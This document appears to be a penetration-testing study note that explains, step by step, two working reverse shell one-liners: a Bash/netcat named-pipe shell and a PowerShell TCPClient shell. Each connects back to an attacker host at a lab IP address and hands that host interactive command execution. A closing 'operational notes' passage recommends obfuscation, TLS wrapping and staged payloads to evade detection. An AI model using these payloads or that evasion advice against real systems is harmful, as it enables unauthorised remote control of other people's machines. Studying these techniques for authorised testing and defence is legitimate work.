#### Netcat/Bash Reverse Shell One-liner

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
#### Remove /tmp/f

```bash
rm -f /tmp/f; 
```

Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.
#### Make A Named Pipe

```bash
mkfifo /tmp/f; 
```

Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the `FIFO named pipe `file.
#### Output Redirection

```bash
cat /tmp/f | 
```

Concatenates the `FIFO` named pipe file `/tmp/f`, the pipe (`|`) connects the standard output of cat `/tmp/f` to the standard input of the command that comes after the pipe (`|`).
#### Set Shell Options

```shell-session
/bin/bash -i 2>&1 | 
```

Specifies the command language interpreter using the `-i` option to ensure the `shell` is interactive.  
`2>&1` redirects the `standard error` (`2`) to the `standard output` (`1`).  
Both streams are combined and then sent through the pipe (`|`) to the next command.

#### Open a Connection with Netcat

```bash
nc 10.10.14.12 7777 > /tmp/f  
```

Uses `Netcat` to open a TCP connection to the attack host `10.10.14.12` on port `7777`.

Netcat's output is redirected (`>`) to the FIFO `/tmp/f`, feeding the remote `Bash` process' I/O into the pipe.

This completes the loop, delivering an interactive `shell` to the awaiting `Netcat` `listener`.

---

# Powershell

#### Powershell One-liner

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```/

`powershell -nop -c " ... "`  
`PowerShell`: the host interpreter that runs the whole payload.  
`-nop`: no profile — skips user profiles to avoid delays and reduce noise.  
`-c`: run the following command string.

`$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);`  
Creates a `TCPClient` object that opens an outbound `TCP` connection to `10.10.14.158:443` (the attacker's `listener`).

`$stream = $client.GetStream();`  
Grabs the `network stream` (`GetStream()`) for reading and writing raw bytes over that TCP connection.

`[byte[]]$bytes = 0..65535|%{0};`  
Allocates a `byte[]` buffer of size 65,536 to hold incoming data.

`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ ... }`  
Reads from the `stream` into the buffer in a loop; `$i` is number of bytes read. Loop runs until the connection closes.

`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);`  
Uses `ASCIIEncoding` to convert the raw `bytes` into a `string` command received from the remote side.

`$sendback = (iex $data 2>&1 | Out-String );`  
`iex` (`Invoke-Expression`) executes the received `command`. `2>&1` merges `stderr` into `stdout` so errors are captured. `Out-String` converts the output to a single string.

`$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';`  
Appends a prompt (current working directory from `pwd`) to the output so the remote operator sees a shell-like prompt.

`$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);`  
Encodes the combined output/prompt back into `bytes` for network transmission.

`$stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush();`  
Writes those `bytes` back down the TCP `stream` to the attacker and flushes the buffer to ensure immediate delivery.

`$client.Close()`  
Closes the `TCP` connection when the loop ends.

Summary: this is a `PowerShell` `reverse shell` payload. The target initiates an outbound `TCP` connection to the attacker's `listener` at `10.10.14.158:443`, decodes incoming commands, executes them (`iex`), captures both output and errors, and sends results back over the same `stream`. Using `443` is a stealth choice (blends with HTTPS egress); `-nop` reduces local noise.

Operational notes (quick):  
`Reverse shell`, `TCP`, `iex`, `ASCIIEncoding`, `listener`, `443` are high-detection vectors — consider obfuscation, TLS wrapping, or staged payloads for reliability and stealth.


